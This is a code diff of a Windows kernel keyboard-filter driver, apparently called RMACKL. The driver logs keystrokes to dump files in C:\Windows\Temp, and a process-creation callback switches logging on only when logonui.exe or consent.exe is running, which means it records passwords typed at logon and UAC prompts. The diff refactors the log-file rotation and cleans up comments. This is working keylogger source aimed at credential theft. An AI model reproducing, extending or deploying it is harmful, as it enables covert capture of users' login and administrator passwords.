@@ -5,10 +5,10 @@
 
 #ifdef ALLOC_PRAGMA
 #pragma alloc_text (INIT, DriverEntry)
-// #pragma alloc_text (INIT, DriverUnload)
 #pragma alloc_text (PAGE, RMACKL_EvtDeviceAdd)
 #pragma alloc_text (PAGE, RMACKL_EvtIoInternalDeviceControl)
 #endif
+
 // Handle for the log file.
 HANDLE fileHandle;
 
@@ -21,29 +21,31 @@ ULONG written;
 // Buffer size at which the key-logs are flushed to log file.
 #define LOG_TRIGGER_POINT 1
 
-#define PRId64       "lld"
-
 // Size of the scancodes table.
 #define SZ_KEYTABLE 0x5A
 
+// Key states
 bool isCapsOn = FALSE;
 bool isShift = FALSE;
 bool capsBit = 0;
 
 // Created (true) or Terminated (false) status for secure processes: logonui.exe & consent.exe
-bool processStatus[] = { FALSE, FALSE };
+BOOLEAN processStatus[] = { FALSE, FALSE };
 
 // Whether user is on the secure desktop
 bool secureScreen = FALSE;
 
-// CHAR* outputBuffer = (char[500]){ 0 };
+// Whether log file is opened successfully and a handle is available
 bool isFileReady = FALSE;
 
+// Current filename for the log file
 char* currFileName = (char[100]){ 0 };
 
+// Time states for switching to new file
 ULONG lastTime = 0;
-ULONG threshold = 300;
+ULONG threshold = 300; // in seconds
 
+// Keyboard scancodes to key mapping tables
 char* keytable[SZ_KEYTABLE] = {
 	"[INVALID]",		// 0	00
 	"[ESCAPE]",			// 1	01
@@ -136,7 +138,6 @@ char* keytable[SZ_KEYTABLE] = {
 	"F12",				// 88	58
 	"="					// 89	59
 };
-
 char* keytable_alternate[SZ_KEYTABLE] = {
 	"[INVALID]",		// 0	00
 	"[INVALID]",		// 1	01
@@ -230,16 +231,13 @@ char* keytable_alternate[SZ_KEYTABLE] = {
 	"[INVALID]"			// 89	59
 };
 
-VOID SetCurrFileName() {
-	ULONG time = 0;
-	LARGE_INTEGER pTime;
-	KeQuerySystemTime(&pTime);
-	RtlTimeToSecondsSince1970(&pTime, &time);
-
-	if (time - lastTime > threshold) {
-		sprintf(currFileName, "\\DosDevices\\C:\\Windows\\Temp\\RMACKLDump%ld.dat\0", time);
-		lastTime = time;
-	}
+/**
+ Set the filename for the log file if threshold seconds has been passed since last change.
+ @param time: The system time in seconds
+ */
+VOID SetCurrFileName(ULONG time) {
+	sprintf(currFileName, "\\DosDevices\\C:\\Windows\\Temp\\RMACKLDump%ld.dat\0", time);
+	lastTime = time;
 }
 
 /**
@@ -367,6 +365,10 @@ NTSTATUS OpenLogFile() {
 	return status;
 }
 
+/**
+ Close the handle to log file
+ @return Status of the operation
+ */
 NTSTATUS CloseLogFile() {
 	isFileReady = FALSE;
 	NTSTATUS status = ZwClose(fileHandle);
@@ -536,60 +538,47 @@ VOID ProcessCallback(IN HANDLE hParentId, IN HANDLE hProcessId, IN BOOLEAN bCrea
 	NTSTATUS status = PsLookupProcessByProcessId(hProcessId, &process);
 	if (!NT_SUCCESS(status)) {
 		DebugPrint(("Unable to lookup process"));
-		/*sprintf(outputBuffer, "Unable to lookup process");
-		WriteDebugToLogFile();*/
 		return;
 	}
 	status = SeLocateProcessImageName(process, &processPath);
 	if (!NT_SUCCESS(status)) {
 		DebugPrint(("Unable to locate process executable"));
-		/*sprintf(outputBuffer, "Unable to locate process executable");
-		WriteDebugToLogFile();*/
 		return;
 	}
 
 	DebugPrint(("%s: %wZ\n", bCreate ? "Created   " : "Terminated", processPath));
-	/*sprintf(outputBuffer, "%s: %wZ\n", bCreate ? "Created   " : "Terminated", processPath);
-	WriteDebugToLogFile();*/
-
 	sprintf(processName, "%wZ", processPath);
-	// DebugPrint(("Process Name: %s\n", processName));
-
 	processBaseName = strrchr(processName, '\\');
 
-	//DebugPrint(("%s: %s\n", bCreate ? "Created   " : "Terminated", processBaseName));
-	//sprintf(outputBuffer, "%s: %s\n", bCreate ? "Created   " : "Terminated", processBaseName);
-	//WriteDebugToLogFile();
-
-	if (strcmp(strlwr(processBaseName), "\\logonui.exe") == 0) {
-		if (bCreate) {
-			processStatus[0] = TRUE;
-		}
-		else {
-			processStatus[0] = FALSE;
-		}
+	int isLogon = strcmp(strlwr(processBaseName), "\\logonui.exe");
+	int isConsent = strcmp(strlwr(processBaseName), "\\consent.exe");
+	if (isLogon == 0) {
+		processStatus[0] = bCreate;
 	}
-	else if (strcmp(strlwr(processBaseName), "\\consent.exe") == 0) {
-		if (bCreate) {
-			processStatus[1] = TRUE;
-		}
-		else {
-			processStatus[1] = FALSE;
-		}
+	else if (isConsent == 0) {
+		processStatus[1] = bCreate;
 	}
 
-	if (processStatus[0] || processStatus[1]) {
-		SetCurrFileName();
-		OpenLogFile();
-		secureScreen = TRUE;
-		//sprintf(outputBuffer, "[Secure Screen START]\n");
-		//WriteDebugToLogFile();
-	}
-	else {
-		secureScreen = FALSE;
-		CloseLogFile();
-		//sprintf(outputBuffer, "[Secure Screen STOP]\n");
-		//WriteDebugToLogFile();
+	if (isLogon == 0 || isConsent == 0) {
+		ULONG time = 0;
+		LARGE_INTEGER pTime;
+		KeQuerySystemTime(&pTime);
+		RtlTimeToSecondsSince1970(&pTime, &time);
+
+		if (processStatus[0] || processStatus[1]) {
+			if (time - lastTime > threshold) {
+				if (isFileReady) CloseLogFile();
+				SetCurrFileName(time);
+				OpenLogFile();
+			}
+			secureScreen = TRUE;
+		}
+		else {
+			secureScreen = FALSE;
+			if (time - lastTime > threshold) {
+				if (isFileReady) CloseLogFile();
+			}
+		}
 	}
 }
 
@@ -668,8 +657,6 @@ NTSTATUS RMACKL_EvtDeviceAdd(IN WDFDRIVER Driver, IN PWDFDEVICE_INIT DeviceInit)
 	NTSTATUS result = PsSetCreateProcessNotifyRoutine(ProcessCallback, FALSE);
 	if (!NT_SUCCESS(result)) {
 		DebugPrint(("Error (PsSetCreateProcessNotifyRoutine): 0x%x\n", result));
-		//sprintf(outputBuffer, "Error (PsSetCreateProcessNotifyRoutine): 0x%x\n", result);
-		//WriteDebugToLogFile();
 	}
 
 	// Set total written records to 0
@@ -905,13 +892,3 @@ NTSTATUS CreateWorkItem(WDFDEVICE DeviceObject) {
 VOID RMACKLQueueWorkItem(WDFWORKITEM workItem) {
 	WdfWorkItemEnqueue(workItem);
 }
-
-/**
- * Driver unload routine.
- * @param Driver: The WDF Driver.
- **/
- //void DriverUnload(IN WDFDRIVER Driver) {
- //	UNREFERENCED_PARAMETER(Driver);
- //	PsSetCreateProcessNotifyRoutine(ProcessCallback, TRUE);
- //	ZwClose(fileHandle);
- //}
